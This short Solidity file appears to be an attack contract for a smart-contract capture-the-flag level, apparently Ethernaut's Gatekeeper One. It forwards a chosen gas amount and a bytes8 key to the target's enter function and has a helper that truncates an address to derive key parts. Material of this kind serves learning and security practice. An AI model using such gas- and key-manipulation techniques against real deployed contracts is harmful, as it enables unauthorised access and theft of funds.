// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateKeeperOneAttack {
    address public gatekeeper;

    constructor(address _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function letMeIn(bytes8 _key, uint256 _gas) public {
        gatekeeper.call{gas: _gas}(
            abi.encodeWithSignature("enter(bytes8)", _key)
        );
    }

    function get_three(address _address)
        public
        view
        returns (uint160 one, uint16 two)
    {
        one = uint160(_address);
        two = uint16(uint160(_address));
    }
}